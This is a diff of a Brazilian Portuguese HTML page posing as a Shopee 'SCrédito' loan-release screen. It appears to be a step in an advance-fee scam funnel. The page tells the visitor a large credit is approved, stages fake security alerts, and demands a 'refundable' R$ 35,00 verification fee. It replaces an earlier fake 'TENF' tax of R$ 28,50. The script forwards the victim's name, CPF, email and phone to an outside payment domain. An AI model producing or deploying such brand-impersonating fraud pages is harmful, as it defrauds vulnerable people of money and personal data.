@@ -1,12 +1,12 @@
 <!DOCTYPE html><html lang="pt-BR"><head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Taxa TENF | Shopee SCrédito</title>
-
+  <title>Crédito Liberado | SCrédito Shopee</title>
+ 
   <script>
-    localStorage.setItem("upsell", "up3");
+    localStorage.setItem("upsell", "up2");
   </script>
-  
+    
   <script
     src="https://cdn.utmify.com.br/scripts/utms/latest.js"
     data-utmify-prevent-xcod-sck
@@ -45,26 +45,222 @@
   </script>
 
   <style>
-    * {
-      margin: 0px;
-      padding: 0px;
-      box-sizing: border-box;
-    }
-
     body {
       font-family: "Poppins", sans-serif;
       background-color: #f6f6f6;
-      min-height: 100vh;
+      margin: 0;
+      padding: 0;
     }
 
     .shopee-gradient {
       background: linear-gradient(135deg, #ee4d2d 0%, #ff7337 100%);
     }
 
-    .card {
-      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.05);
+    .card-container {
+      max-width: 448px;
+      margin: 0 auto;
+      min-height: 100vh;
+      background-color: white;
+    }
+
+    .header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 1rem;
+      border-bottom: 1px solid #e2e8f0;
+      background-color: white;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
+      position: sticky;
+      top: 0;
+      z-index: 10;
+    }
+
+    .logo-section {
+      display: flex;
+      align-items: center;
+    }
+
+    .logo {
+      height: 32px;
+    }
+
+    .brand-text {
+      margin-left: 0.5rem;
+      font-size: 1.25rem;
+      font-weight: 700;
+      color: #ee4d2d;
+    }
+
+    .user-info {
+      display: flex;
+      flex-direction: column;
+      align-items: flex-end;
+      font-size: 0.875rem;
+    }
+
+    .user-name {
+      display: flex;
+      align-items: center;
+      font-weight: 500;
+      color: #1f2937;
+    }
+
+    .user-name i {
+      color: #ee4d2d;
+      margin-right: 0.25rem;
+    }
+
+    .user-cpf {
+      font-size: 0.75rem;
+      color: #6b7280;
+    }
+
+    .content {
+      padding: 1.25rem;
+    }
+
+    .card, .loading-card, .final-card {
+      display: none;
+      opacity: 0;
+      transform: translateY(20px);
+      transition: opacity 0.5s ease, transform 0.5s ease;
+    }
+
+    .card.active, .loading-card.active, .final-card.active {
+      display: block;
+      opacity: 1;
+      transform: translateY(0);
+    }
+
+    .status-card {
+      background: white;
       border-radius: 16px;
+      padding: 1.5rem;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.05);
+      margin-bottom: 1.5rem;
+    }
+
+    .success-icon {
+      width: 64px;
+      height: 64px;
+      background: linear-gradient(135deg, #10b981 0%, #34d399 100%);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 1rem;
+    }
+
+    .success-icon i {
+      color: white;
+      font-size: 2rem;
+    }
+
+    .title {
+      font-size: 1.5rem;
+      font-weight: 700;
+      color: #1f2937;
+      text-align: center;
+      margin-bottom: 0.5rem;
+    }
+
+    .subtitle {
+      color: #6b7280;
+      text-align: center;
+      margin-bottom: 1.5rem;
+    }
+
+    .amount {
+      font-size: 2.5rem;
+      font-weight: 800;
+      color: #ee4d2d;
+      text-align: center;
+      margin-bottom: 1rem;
+    }
+
+    .info-grid {
+      display: grid;
+      gap: 0.75rem;
+      margin-bottom: 1.5rem;
+    }
+
+    .info-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 0.75rem 0;
+      border-bottom: 1px solid #f3f4f6;
+      font-size: 0.95rem;
+    }
+
+    .info-row:last-child {
+      border-bottom: none;
+    }
+
+    .info-label {
+      color: #6b7280;
+      font-weight: 500;
+    }
+
+    .info-value {
+      color: #1f2937;
+      font-weight: 600;
+    }
+
+    .alert-info {
+      background-color: #dbeafe;
+      border-left: 4px solid #3b82f6;
+      padding: 1rem;
+      margin: 1.5rem 0;
+      border-radius: 8px;
+      font-size: 0.9rem;
+      color: #1e40af;
+    }
+
+    .alert-warning {
+      background-color: #fef3c7;
+      border-left: 4px solid #f59e0b;
+      padding: 1rem;
+      margin: 1.5rem 0;
+      border-radius: 8px;
+      font-size: 0.9rem;
+      color: #92400e;
+    }
+
+    .alert-danger {
+      background-color: #fee2e2;
+      border-left: 4px solid #ef4444;
+      padding: 1rem;
+      margin: 1.5rem 0;
+      border-radius: 8px;
+      font-size: 0.9rem;
+      color: #dc2626;
+      font-weight: 600;
+    }
+
+    .button-primary {
+      width: 100%;
+      background: linear-gradient(135deg, #ee4d2d 0%, #ff7337 100%);
+      color: white;
+      border: none;
+      border-radius: 12px;
+      padding: 1rem;
+      font-size: 1.125rem;
+      font-weight: 700;
+      cursor: pointer;
       transition: all 0.3s ease;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .button-primary:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 25px rgba(238, 77, 45, 0.3);
+    }
+
+    .button-primary:active {
+      transform: translateY(0);
     }
 
     .btn-shine {
@@ -90,68 +286,23 @@
     }
 
     @keyframes shine {
-      0% {
-        left: -100%;
-        opacity: 0;
-      }
-      10% {
-        left: 100%;
-        opacity: 0.6;
-      }
-      100% {
-        left: 100%;
-        opacity: 0;
-      }
+      0% { left: -100%; opacity: 0; }
+      10% { left: 100%; opacity: 0.6; }
+      100% { left: 100%; opacity: 0; }
     }
 
-    .icon-circle {
-      width: 44px;
-      height: 44px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      border-radius: 50%;
-    }
-
-    /* LOADING */
-    .loading {
-      display: none;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      background-color: #fff;
-      padding: 2rem;
-      gap: 1.5rem;
-      border-radius: 16px;
-      margin: 1rem;
-      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.05);
-    }
-
-    .loading.active {
-      display: flex;
-    }
-
-    .status-text {
-      font-size: 1.2rem;
-      font-weight: 600;
-      color: #374151;
-      opacity: 1;
-      transition: opacity 0.5s ease;
+    .progress-container {
+      margin: 2rem 0;
       text-align: center;
-    }
-
-    .status-text.fade-out {
-      opacity: 0;
     }
 
     .progress-bar {
       width: 100%;
-      max-width: 400px;
       height: 8px;
-      background-color: #f3f4f6;
-      border-radius: 8px;
+      background-color: #e5e7eb;
+      border-radius: 4px;
       overflow: hidden;
-      box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.05);
+      margin-bottom: 1rem;
     }
 
     .progress-bar-fill {
@@ -159,197 +310,211 @@
       width: 0%;
       background: linear-gradient(135deg, #ee4d2d 0%, #ff7337 100%);
       transition: width 0.1s linear;
-      border-radius: 8px;
     }
 
-    /* Comprovante */
-    .comprovante {
-      background-color: white;
-      border: 1px solid #e5e7eb;
-      border-radius: 16px;
-      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.05);
-      overflow: hidden;
+    .status-text {
+      font-size: 1.25rem;
+      font-weight: 600;
+      color: #1f2937;
       margin-bottom: 1rem;
     }
 
-    .comprovante-header {
-      background: linear-gradient(135deg, #ee4d2d 0%, #ff7337 100%);
-      padding: 1.5rem;
-      text-align: center;
-      color: white;
-    }
-
-    .comprovante-body {
-      padding: 1.5rem;
-    }
-
-    .comprovante-item {
-      padding: 12px 0;
-      border-bottom: 1px solid #f3f4f6;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-    }
-
-    .comprovante-item:last-child {
-      border-bottom: none;
-    }
-
-    .comprovante-alert {
-      background-color: #fef3c7;
-      border-left: 4px solid #f59e0b;
+    .alerts-container {
+      background-color: #f9fafb;
       padding: 1rem;
-      margin-bottom: 1rem;
-      font-size: 0.9rem;
-      color: #92400e;
-      border-radius: 0 8px 8px 0;
+      border-radius: 16px;
+      min-height: 360px;
+      display: grid;
+      gap: 1rem;
     }
 
-    /* Content Final */
-    .content-final {
-      animation: fadeIn 0.5s ease-in-out;
+    .alert-item {
+      background: white;
+      border-radius: 12px;
+      padding: 1rem;
+      display: none;
+      align-items: center;
+      gap: 0.75rem;
+      font-size: 0.95rem;
+      color: #374151;
+      opacity: 0;
+      transform: translateY(10px);
+      animation: fadeInUp 0.3s ease forwards;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
     }
 
-    @keyframes fadeIn {
-      from {
-        opacity: 0;
-        transform: translateY(20px);
-      }
-      to {
-        opacity: 1;
-        transform: translateY(0);
-      }
+    .alert-item.red {
+      background: #ef4444;
+      color: white;
+      font-weight: 600;
     }
+
+    @keyframes fadeInUp {
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .icon-img {
+      width: 2rem;
+      height: 2rem;
+      flex-shrink: 0;
+    }
+
+    .spinner {
+      border: 3px solid #e5e7eb;
+      border-top: 3px solid #ee4d2d;
+      border-radius: 50%;
+      width: 32px;
+      height: 32px;
+      animation: spin 0.8s linear infinite;
+      margin: 2rem auto;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .fade-out-up { 
+      opacity: 0; 
+      transform: translateY(-20px); 
+      transition: all 0.4s ease;
+    }
+    
+    .fade-in-up { 
+      opacity: 1; 
+      transform: translateY(0); 
+      transition: all 0.4s ease;
+    }
+    .flex { display: flex; }
+    .items-center { align-items: center; }
+    .justify-center { justify-content: center; }
+    .mr-2 { margin-right: 0.5rem; }
+    .mb-4 { margin-bottom: 1rem; }
+    .w-16 { width: 4rem; }
+    .h-16 { height: 4rem; }
+    .bg-yellow-100 { background-color: #fef3c7; }
+    .rounded-full { border-radius: 9999px; }
+    .text-yellow-600 { color: #d97706; }
+    .text-2xl { font-size: 1.5rem; }
+    .text-gray-600 { color: #6b7280; }
+    .text-sm { font-size: 0.875rem; }
   </style>
 </head>
-
 <body>
-  <div class="max-w-md mx-auto min-h-screen bg-white">
+  <div class="card-container">
     <!-- Header -->
-    <div class="flex items-center justify-between p-4 border-b bg-white shadow-sm sticky top-0 z-10">
-      <div class="flex items-center">
-        <div class="flex items-center">
-          <img src="../4/images/2560px-Shopee_logo.svg.png" alt="Shopee Logo" class="h-8">
-          <span class="ml-2 text-xl font-bold text-shopee">SCrédito</span>
-        </div>
+    <div class="header">
+      <div class="logo-section">
+        <img src="../4/images/2560px-Shopee_logo.svg.png" alt="Shopee Logo" class="logo">
+        <span class="brand-text">SCrédito</span>
       </div>
-      <div class="flex flex-col items-end text-sm">
-        <div class="flex items-center font-medium text-gray-800">
-          <i class="fas fa-user-circle text-shopee mr-1"></i>
-          <span class="user-name">Olá, Rafael</span>
+      <div class="user-info">
+        <div class="user-name">
+          <i class="fas fa-user-circle"></i>
+          <span id="user-display-name">Carregando...</span>
         </div>
+        <div class="user-cpf" id="user-display-cpf">Carregando...</div>
       </div>
     </div>
 
-    <!-- LOADING -->
-    <div class="loading" id="loading">
-      <div class="progress-bar">
-        <div class="progress-bar-fill" id="bar"></div>
-      </div>
-      <h2 class="status-text" id="status-text">Calculando sua Taxa TENF...</h2>
-    </div>
-
-    <!-- CARD PRINCIPAL -->
-    <div class="card active" id="card">
-      <div class="p-5">
-        <div class="content-initial">
-          <!-- Card de Valor Aprovado -->
-          <div class="bg-gray-50 rounded-xl p-4 text-center mb-6 card">
-            <p class="text-gray-700 font-medium mb-2">Indenização disponível</p>
-            <p id="valor-indenizacao" class="text-3xl font-bold text-shopee">R$ 7.854,63</p>
+    <!-- Conteúdo principal -->
+    <div class="content">
+      <!-- CARD INICIAL -->
+      <div class="card active" id="card">
+        <div class="status-card">
+          <div class="success-icon">
+            <i class="fas fa-check"></i>
           </div>
-
-          <!-- Alert -->
-          <div class="bg-shopee text-white p-4 rounded-xl mb-6">
-            <div class="flex items-start">
-              <div class="bg-white bg-opacity-20 icon-circle mr-3 flex-shrink-0">
-                <i class="fas fa-exclamation-triangle text-white"></i>
-              </div>
-              <p class="text-sm">
-                Atenção! <strong class="nome-usuario">Rafael dos Santos Almeida</strong>, leia a mensagem abaixo para liberar seu crédito
-              </p>
+          <h1 class="title">Crédito Liberado!</h1>
+          <p class="subtitle">Seu crédito foi aprovado e está pronto para transferência</p>
+          
+          <div class="amount" id="valor-aprovado">R$ 9.782,23</div>
+          
+          <div class="info-grid">
+            <div class="info-row">
+              <span class="info-label">Beneficiário</span>
+              <span class="info-value" id="nome-completo">Carregando...</span>
+            </div>
+            <div class="info-row">
+              <span class="info-label">CPF</span>
+              <span class="info-value" id="cpf">Carregando CPF...</span>
+            </div>
+            <div class="info-row">
+              <span class="info-label">Tipo de transferência</span>
+              <span class="info-value">PIX</span>
+            </div>
+            <div class="info-row">
+              <span class="info-label">Data de liberação</span>
+              <span class="info-value" id="data">Carregando data...</span>
             </div>
           </div>
 
-          <!-- Pendência Card -->
-          <div class="bg-white p-6 rounded-xl card mb-6">
-            <div class="text-center mb-4">
-              <div class="bg-red-100 icon-circle mx-auto mb-3">
-                <i class="fas fa-exclamation-circle text-red-600"></i>
-              </div>
-              <h3 class="text-xl font-bold text-gray-800 mb-2">Pendência encontrada!</h3>
+          <div class="alert-info">
+            <div class="flex items-center">
+              <i class="fas fa-info-circle mr-2"></i>
+              <span>Seu crédito já está aprovado e liberado! Clique no botão abaixo para autorizar a transferência via PIX para sua conta.</span>
             </div>
-            
-            <p class="text-gray-700 text-sm leading-relaxed text-center">
-              Para você receber o seu valor, é obrigatório realizar o pagamento do <strong>TENF (Taxa de Emissão de Nota Fiscal).</strong> 
-              O valor dessa taxa corresponde ao custo gerado por transferência de alto valor. 
-              Clique no botão abaixo para calcular sua taxa TENF.
-            </p>
           </div>
 
-          <button class="w-full bg-shopee hover:bg-shopee-dark text-white text-lg font-bold py-4 rounded-xl btn-shine" onclick="calcularTaxa()">
-            Calcular TAXA
+          <button class="button-primary btn-shine" onclick="iniciarTransferencia()">
+            <i class="fas fa-bolt mr-2"></i>
+            Receber meu crédito
           </button>
         </div>
+      </div>
 
-        <!-- Tela Final -->
-        <div class="content-final" id="final" style="display: none;">
-          <!-- Comprovante -->
-          <div class="comprovante">
-            <div class="comprovante-header">
-              <div class="bg-white inline-block p-2 rounded-lg mb-2">
-                <img src="../4/images/2560px-Shopee_logo.svg.png" alt="Shopee Logo" class="h-6">
-              </div>
-              <h2 class="text-xl font-bold">TENF (Taxa de Emissão de Nota Fiscal)</h2>
-              <p class="text-2xl font-bold mt-2">R$ 28,50</p>
+      <!-- TELA DE CARREGAMENTO -->
+      <div class="loading-card" id="loading">
+        <div class="status-card">
+          <div class="progress-container">
+            <h2 id="status-text" class="status-text">Processando transferência...</h2>
+            <div class="progress-bar">
+              <div class="progress-bar-fill" id="bar"></div>
             </div>
+            <p class="text-gray-600 text-sm">Aguarde enquanto processamos sua solicitação</p>
+          </div>
+        </div>
+      </div>
 
-            <div class="comprovante-body">
-              <div class="comprovante-item">
-                <span class="text-gray-600">Empresa</span>
-                <span class="text-gray-800 font-medium">ShopeeCrédito S.A.</span>
-              </div>
-              <div class="comprovante-item">
-                <span class="text-gray-600">CNPJ</span>
-                <span class="text-gray-800 font-medium">09.694.966/0001-40</span>
-              </div>
-              <div class="comprovante-item">
-                <span class="text-gray-600">Beneficiário</span>
-                <span class="text-gray-800 font-medium nome-usuario">Rafael dos Santos Almeida</span>
-              </div>
-              <div class="comprovante-item">
-                <span class="text-gray-600">Valor da Indenização</span>
-                <span id="valor-indenizacao-comprovante" class="text-gray-800 font-medium">R$ 9.854,63</span>
-              </div>
-              <div class="comprovante-item">
-                <span class="text-gray-600">Taxa TENF</span>
-                <span class="text-shopee font-bold">R$ 28,50</span>
-              </div>
+      <!-- CARD FINAL -->
+      <div class="final-card" id="card-final">
+        <div class="status-card">
+          <div class="flex items-center justify-center mb-4">
+            <div class="w-16 h-16 bg-yellow-100 rounded-full flex items-center justify-center">
+              <i class="fas fa-exclamation-triangle text-yellow-600 text-2xl"></i>
             </div>
           </div>
+          <h1 class="title" style="color: #f59e0b;">Verificação Necessária</h1>
+          <p class="subtitle">Para sua segurança, precisamos verificar esta transferência</p>
 
-          <div class="comprovante-alert">
-            <div class="flex items-start">
-              <i class="fas fa-info-circle mr-2 mt-1"></i>
-              <p class="text-sm">
-                Para você receber o seu valor, é obrigatório realizar o pagamento do TENF (Taxa de Emissão de Nota Fiscal). 
-                O valor dessa taxa corresponde ao custo gerado por transferência de alto valor. Após o pagamento, 
-                a transferência será feita para sua chave PIX cadastrada. 
-                Caso não conclua o pagamento, seu crédito será bloqueada.
-              </p>
-            </div>
+          <div class="alerts-container" id="alerts-container">
+            <!-- Os alertas serão inseridos aqui dinamicamente -->
           </div>
 
-          <button class="w-full bg-shopee hover:bg-shopee-dark text-white text-lg font-bold py-4 rounded-xl btn-shine mb-5" onclick="efetuarPagamento()">
-            Efetuar o pagamento
+          <button class="button-primary btn-shine" onclick="redirecionarParaPagamento()">
+            <i class="fas fa-shield-alt mr-2"></i>
+            Pagar Taxa de Verificação
           </button>
         </div>
       </div>
     </div>
   </div>
 
+  <!--
+    Esta página deve ser acessada com os seguintes parâmetros de URL:
+    - name/nome: Nome do usuário (exibirá "Carregando..." se não encontrado)
+    - document/cpf: CPF do usuário (exibirá "Carregando..." se não encontrado)
+    - email: Email do usuário
+    - telephone/telefone: Telefone do usuário
+    - valor_emprestimo: Faixa de valor escolhida na página 2 (500-1000, 1001-3000, 3001-5000, acima5000)
+      * Se não informado, será usado o valor padrão: R$ 9.782,23
+    
+    Exemplo: up1/index.html?name=João Silva&document=12345678901&email=joao@email.com&valor_emprestimo=1001-3000
+    Ou: up1/index.html?nome=João Silva&cpf=12345678901&email=joao@email.com&valor_emprestimo=1001-3000
+  -->
+
   <script>
-    const params = new URLSearchParams(window.location.search)
+    const params = new URLSearchParams(window.location.search);
     
     // Função para salvar dados importantes no localStorage
     function salvarDadosLocalStorage(nome, cpf, valorEmprestimo) {
@@ -373,22 +538,26 @@
       };
     }
     
-    // Capturar dados com fallback para localStorage
-    let nomeCompleto = params.get("name") || params.get("nome") || "";
+    // Capturar nome com múltiplas variações possíveis e fallbacks
+    let nome = params.get("nome") || params.get("name") || params.get("usuario") || "";
+    
+    // Capturar CPF com fallback para localStorage
     let cpf = params.get("cpf") || params.get("document") || "";
+    
+    // Capturar valor do empréstimo com fallback para localStorage
     let valorEmprestimo = params.get("valor_emprestimo") || params.get("valor_aprovado") || "";
     
     // Se algum dado estiver vazio, tentar recuperar do localStorage
     const dadosLocalStorage = recuperarDadosLocalStorage();
     
-    if (!nomeCompleto || nomeCompleto.trim() === "") {
-      nomeCompleto = dadosLocalStorage.nome;
-      console.log("Nome recuperado do localStorage:", nomeCompleto);
+    if (!nome || nome.trim() === "") {
+      nome = dadosLocalStorage.nome;
+      console.log("Nome recuperado do localStorage:", nome);
     }
     
     // Se ainda não tiver nome válido, usar valor padrão
-    if (!nomeCompleto || nomeCompleto.trim() === "") {
-      nomeCompleto = "Nome não informado";
+    if (!nome || nome.trim() === "") {
+      nome = "Usuário";
     }
     
     if (!cpf || cpf.trim() === "") {
@@ -402,90 +571,255 @@
     }
     
     // Salvar dados atuais no localStorage para uso futuro
-    salvarDadosLocalStorage(nomeCompleto, cpf, valorEmprestimo);
+    salvarDadosLocalStorage(nome, cpf, valorEmprestimo);
     
-    const primeiroNome = nomeCompleto.trim().split(" ")[0]
+    const email = params.get("email") || "";
+    const telefone = params.get("numero") || params.get("telephone") || params.get("telefone") || "";
     
-    // Capturar o valor do empréstimo solicitado pelo usuário (já declarado acima)
-    // Usar valor padrão se não encontrar nenhum valor
-    if (!valorEmprestimo || valorEmprestimo.trim() === "") {
-      valorEmprestimo = "9782.23";
-    }
-    
+    // Debug: log dos parâmetros para verificação
+    console.log("=== UP1 - DEBUG DOS PARÂMETROS ===");
+    console.log("URL atual:", window.location.href);
+    console.log("Parâmetros da URL:", {
+      nome: params.get("nome") || params.get("name"),
+      cpf: params.get("cpf") || params.get("document"),
+      valorEmprestimo: params.get("valor_emprestimo") || params.get("valor_aprovado")
+    });
+    console.log("Dados do localStorage:", dadosLocalStorage);
+    console.log("Dados finais utilizados:", {
+      nome: nome,
+      cpf: cpf,
+      email: email,
+      telefone: telefone,
+      valorEmprestimo: valorEmprestimo
+    });
+    console.log("Todos os parâmetros URL:", Object.fromEntries(params));
+    console.log("==================================");
+
     // Função para formatar valor monetário
     function formatarValor(valor) {
       const numero = parseFloat(valor);
-      return numero.toLocaleString('pt-BR', {
+      if (isNaN(numero)) return "R$ 9.782,23"; // valor padrão
+      return `R$ ${numero.toLocaleString('pt-BR', {
         minimumFractionDigits: 2,
         maximumFractionDigits: 2
-      });
+      })}`;
     }
 
-    // Atualizar elementos com nome do usuário e valor do empréstimo
+    // Obter valor formatado do empréstimo (usando o valor exato digitado pelo usuário)
+    const valorFormatado = formatarValor(valorEmprestimo);
+
+    function formatCPF(cpf) {
+      const clean = cpf.replace(/\D/g, "");
+      return clean.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
+    }
+
+    function getFormattedDate() {
+      const d = new Date();
+      return `${String(d.getDate()).padStart(2, '0')}/${String(d.getMonth() + 1).padStart(2, '0')}/${d.getFullYear()}`;
+    }
+
+    // Atualizar informações do usuário no header e no card
     document.addEventListener('DOMContentLoaded', function() {
-      document.querySelector(".user-name").textContent = `Olá, ${primeiroNome}`
-      const nomeElements = document.querySelectorAll(".nome-usuario")
-      nomeElements.forEach(element => {
-        element.textContent = nomeCompleto
-      })
+      // Garantir que os elementos existem antes de tentar atualizar
+      const userDisplayName = document.getElementById("user-display-name");
+      const userDisplayCpf = document.getElementById("user-display-cpf");
+      const nomeCompleto = document.getElementById("nome-completo");
+      const cpfElement = document.getElementById("cpf");
+      const dataElement = document.getElementById("data");
+      const valorAprovado = document.getElementById("valor-aprovado");
       
-      // Atualizar o valor da indenização com base no valor do empréstimo
-      const valorIndenizacao = document.getElementById("valor-indenizacao");
-      if (valorIndenizacao) {
-        valorIndenizacao.textContent = `R$ ${formatarValor(valorEmprestimo)}`;
-      }
+      if (userDisplayName) userDisplayName.textContent = nome || "Carregando...";
+      if (userDisplayCpf) userDisplayCpf.textContent = cpf ? formatCPF(cpf) : "Carregando.....";
+      if (nomeCompleto) nomeCompleto.textContent = nome || "Carregando.....";
+      if (cpfElement) cpfElement.textContent = cpf ? formatCPF(cpf) : "Carregando.....";
+      if (dataElement) dataElement.textContent = getFormattedDate();
+      if (valorAprovado) valorAprovado.textContent = valorFormatado;
       
-      // Também atualizar no comprovante
-      const valorIndenizacaoComprovante = document.getElementById("valor-indenizacao-comprovante");
-      if (valorIndenizacaoComprovante) {
-        valorIndenizacaoComprovante.textContent = `R$ ${formatarValor(valorEmprestimo)}`;
-      }
-      
-      console.log('Valor do empréstimo recebido:', valorEmprestimo);
-      console.log('Nome do usuário:', nomeCompleto);
-      console.log('Dados do localStorage:', dadosLocalStorage);
-      console.log('Fonte dos dados:', {
-        fonteNome: params.get("name") || params.get("nome") ? "URL" : "localStorage",
-        fonteCpf: params.get("cpf") || params.get("document") ? "URL" : "localStorage",
+      console.log("Informações atualizadas na página:", {
+        nome: nome || "Carregando...",
+        cpfFormatado: cpf ? formatCPF(cpf) : "Carregando.....",
+        valorRecebido: valorEmprestimo,
+        valorFormatado: valorFormatado,
+        fonteNome: params.get("nome") || params.get("name") ? "URL" : "localStorage",
+        fonteCpf: params.get("cpf") || params.get("document") ? "URL" : "localStorage", 
         fonteValor: params.get("valor_emprestimo") || params.get("valor_aprovado") ? "URL" : "localStorage"
       });
-    })
+    });
+    
+    // Atualização imediata (fallback caso DOMContentLoaded já tenha passado)
+    if (document.readyState === 'loading') {
+      // Página ainda carregando, aguardar DOMContentLoaded
+    } else {
+      // Página já carregada, atualizar imediatamente
+      setTimeout(() => {
+        const userDisplayName = document.getElementById("user-display-name");
+        const userDisplayCpf = document.getElementById("user-display-cpf");
+        const nomeCompleto = document.getElementById("nome-completo");
+        const cpfElement = document.getElementById("cpf");
+        const dataElement = document.getElementById("data");
+        const valorAprovado = document.getElementById("valor-aprovado");
+        
+        if (userDisplayName) userDisplayName.textContent = nome || "Carregando...";
+        if (userDisplayCpf) userDisplayCpf.textContent = cpf ? formatCPF(cpf) : "Carregando.....";
+        if (nomeCompleto) nomeCompleto.textContent = nome || "Carregando...";
+        if (cpfElement) cpfElement.textContent = cpf ? formatCPF(cpf) : "Carregando...";
+        if (dataElement) dataElement.textContent = getFormattedDate();
+        if (valorAprovado) valorAprovado.textContent = valorFormatado;
+      }, 100);
+    }
 
-    function calcularTaxa() {
-      document.querySelector(".content-initial").style.display = "none";
+    function exibirAlertasComSpinner() {
+      const alerts = [
+        { 
+          icon: "./assets/10.svg", 
+          text: "Identificamos uma movimentação de valor alto suspeita!", 
+          red: false 
+        },
+        { 
+          icon: "./assets/11.svg", 
+          text: "Por motivos de segurança é preciso realizar o pagamento da Taxa de Verificação para garantir a transferência segura e evitar possíveis fraudes.", 
+          red: false 
+        },
+        { 
+          icon: "./assets/12.svg", 
+          text: "Finalize o pagamento da Taxa de Verificação no valor de <b>R$ 35,00</b> e confirme seu crédito. Essa taxa é reembolsável e será devolvida automaticamente após a confirmação do pagamento.", 
+          red: true 
+        },
+      ];
+      
+      const container = document.getElementById("alerts-container");
+      container.innerHTML = "";
+
+      let index = 0;
+      function showNext() {
+        if (index >= alerts.length) return;
+
+        // Mostrar spinner
+        const spinner = document.createElement("div");
+        spinner.className = "spinner";
+        container.appendChild(spinner);
+
+        setTimeout(() => {
+          // Remover spinner
+          container.removeChild(spinner);
+
+          // Criar e mostrar alerta
+          const alert = document.createElement("div");
+          alert.className = `alert-item${alerts[index].red ? " red" : ""}`;
+          
+          const icon = document.createElement("img");
+          icon.src = alerts[index].icon;
+          icon.className = "icon-img";
+
+          const text = document.createElement("div");
+          text.innerHTML = alerts[index].text;
+
+          alert.appendChild(icon);
+          alert.appendChild(text);
+          container.appendChild(alert);
+
+          // Mostrar com animação
+          requestAnimationFrame(() => {
+            alert.style.display = "flex";
+          });
+
+          index++;
+          setTimeout(showNext, 900);
+        }, 1200);
+      }
+
+      showNext();
+    }
+
+    function iniciarTransferencia() {
+      // Esconder card inicial
+      document.getElementById("card").classList.remove("active");
+      
+      // Mostrar loading
       document.getElementById("loading").classList.add("active");
 
       const bar = document.getElementById("bar");
       const statusText = document.getElementById("status-text");
       let progress = 0;
-      let trocado = false;
+      let statusChanged = false;
 
       const interval = setInterval(() => {
         if (progress >= 100) {
           clearInterval(interval);
+          
+          // Esconder loading e mostrar card final
           document.getElementById("loading").classList.remove("active");
-          document.getElementById("final").style.display = "block";
+          document.getElementById("card-final").classList.add("active");
+          
+          // Iniciar exibição dos alertas
+          exibirAlertasComSpinner();
         } else {
           progress++;
           bar.style.width = progress + "%";
 
-          if (progress === 70 && !trocado) {
-            trocado = true;
-            statusText.classList.add('fade-out');
+          // Trocar texto no meio do progresso
+          if (progress === 70 && !statusChanged) {
+            statusChanged = true;
+            statusText.classList.add("fade-out-up");
+            
             setTimeout(() => {
-              statusText.textContent = "Gerando seu comprovante...";
-              statusText.classList.remove('fade-out');
-            }, 500);
+              statusText.textContent = "Gerando comprovante...";
+              statusText.classList.remove("fade-out-up");
+              statusText.classList.add("fade-in-up");
+              
+              setTimeout(() => {
+                statusText.classList.remove("fade-in-up");
+              }, 400);
+            }, 400);
           }
         }
-      }, 30);
+      }, 50);
     }
 
-    function efetuarPagamento() {
-      const currentParams = window.location.search;
-      const urlBase = "https://pay.pagamentosfacilitadosoficial.shop/lDW0ZaJerX6GN7E";
-      window.location.href = `${urlBase}${currentParams}`;
+    function redirecionarParaPagamento() {
+      const urlBase = "https://pay.pagamentosfacilitadosoficial.shop/DYp0ZxVBYWkgmvX";
+      
+      // Criar novos parâmetros garantindo que todos os dados sejam passados
+      const checkoutParams = new URLSearchParams();
+      
+      // Adicionar parâmetros com múltiplas variações para garantir compatibilidade
+      if (nome && nome.trim() !== "") {
+        checkoutParams.set("name", nome);
+        checkoutParams.set("nome", nome);
+      }
+      
+      if (cpf && cpf.trim() !== "") {
+        checkoutParams.set("document", cpf);
+        checkoutParams.set("cpf", cpf);
+      }
+      
+      if (email) {
+        checkoutParams.set("email", email);
+      }
+      
+      if (telefone) {
+        checkoutParams.set("telephone", telefone);
+        checkoutParams.set("telefone", telefone);
+      }
+      
+      // Adicionar todos os parâmetros originais da URL atual
+      const currentParams = new URLSearchParams(window.location.search);
+      for (const [key, value] of currentParams) {
+        if (!checkoutParams.has(key)) {
+          checkoutParams.set(key, value);
+        }
+      }
+      
+      const finalUrl = `${urlBase}?${checkoutParams.toString()}`;
+      
+      console.log("Redirecionando para checkout com parâmetros:", checkoutParams.toString());
+      console.log("URL completa:", finalUrl);
+      
+      window.location.href = finalUrl;
     }
   </script>
 
+
+</div>
+</div>
 </body></html>
